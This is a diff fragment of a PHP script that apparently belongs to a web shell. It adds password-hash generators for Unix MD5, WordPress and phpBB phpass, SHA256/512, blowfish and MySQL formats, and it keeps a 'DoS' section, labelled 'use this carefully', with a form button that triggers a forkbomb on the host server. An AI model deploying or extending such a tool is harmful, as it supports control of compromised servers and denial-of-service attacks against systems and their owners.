+   <option value=\"sha256\"".($_POST["cryptmethod"] == "sha256"?" selected":"").">SHA256 - \$5\$</option>
+   <option value=\"sha512\"".($_POST["cryptmethod"] == "sha512"?" selected":"").">SHA512 - \$6\$</option>
+   <option value=\"mysql4\"".($_POST["cryptmethod"] == "mysql4"?" selected":"").">MySQL4</option>
+   <option value=\"mysql5\"".($_POST["cryptmethod"] == "mysql5"?" selected":"").">MySQL5</option>
+   </select> salt: <input type=\"text\" name=\"hash\" size=\"9\" maxlength=\"8\" value=\"".$hash."\"> <input type=\"text\" name=\"hash1\" size=\"9\" maxlength=\"8\" value=\"".$hash1."\"> <input type=\"text\" name=\"hash2\" size=\"7\" maxlength=\"6\" value=\"".$hash2."\"> <font color=\"gray\">(salt needed for: md5(unix,wordpress,phpbb3,apr1) - 8 symbols, sha(256,512) - 16 symbols, and blowfish - 22 symbols. ignore these fields if you use other algorithms)</font><br>
    <input type=\"submit\" name=\"crypt\" value=\"go\"> 
    </form>";
    echo $cryptform;
    if(isset($_POST['crypt'])) {
-    function entityenc($str) {
-     $text_array=explode("\r\n", chunk_split($str, 1));
-     for ($n=0; $n < count($text_array) - 1; $n++) {
-      $newstring .= "&#" . ord($text_array[$n]) . ";";
-     }
-     return $newstring;
-    }
-    function entitydec($str) {
-     $str=str_replace(';', '; ', $str);
-     $text_array=explode(' ', $str);
-     for ($n=0; $n < count($text_array) - 1; $n++) {
-      $newstring .= chr(substr($text_array[$n], 2, 3));
-     }
-     return $newstring;
-    }
-    function asc2hex($str) {
-     return chunk_split(bin2hex($str), 2, " ");
-    }
-    function hex2asc($str) {
-     $str=str_replace(" ", "", $str);
-     for ($n=0; $n<strlen($str); $n+=2) {
-      $newstring .=  pack("C", hexdec(substr($str, $n, 2)));
-     }
-     return $newstring;
-    } 
     $text=$_POST['text'];
     if($text == '') {
-     die("<p>empty form</p>\n");
+     die("<p>empty form</p>\n".$pageend."");
     }
+    $hash=$_POST['hash'];
+    $hash1=$_POST['hash1'];
+    $hash2=$_POST['hash2'];
     echo("--><br><textarea cols=\"80\" rows=\"4\">");
     switch ($_POST['cryptmethod']) {
     case "asc2hex":
@@ -1744,7 +1907,7 @@ switch ($_REQUEST['p']) {
      $text=base64_decode($text);
      break;
     case 'crypt':
-     $text=crypt($text, 'CRYPT_STD_DES');
+     $text=crypt($text,'CRYPT_STD_DES');
      break;
     case 'entityenc':
      $text=entityenc($text);
@@ -1758,8 +1921,32 @@ switch ($_REQUEST['p']) {
     case 'md5md5':
      $text=md5(md5($text));
      break;
+    case 'md5unix':
+     $text=unap($text,$hash,'$1$');
+     break;
+    case 'md5wp':
+     $text=phpass($text,$hash,8192,'$P$B');
+     break;
+    case 'md5bb':
+     $text=phpass($text,$hash,2048,'$H$9');
+     break;
+    case 'md5apr':
+     $text=unap($text,$hash,'$apr1$');
+     break;
     case 'sha1':
      $text=sha1($text);
+     break;
+    case 'sha256':
+     $text=crypt($text,'$5$'.$hash.$hash1);
+     break;
+    case 'sha512':
+     $text=crypt($text,'$6$'.$hash.$hash1);
+     break;
+    case 'blowfish':
+     $text=crypt($text,'$2a$07$'.$hash.$hash1.$hash2);
+     break;
+    case 'mysql4':
+     $text=mysql4($text);
      break;
     case 'mysql5':
      $text='*'.strtoupper(sha1(sha1($text,TRUE)));
@@ -1769,8 +1956,9 @@ switch ($_REQUEST['p']) {
     echo("$text</textarea><br>");
    }
    //decoders end
-   echo '<br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
+   echo '<br><br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
    echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'"><input name="p" type="hidden" value="e"><input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb"></form>';
+   echo $pageend;
   }
   if (!empty($_POST["extraz"])) {
    switch ($_POST["extraz"]) {
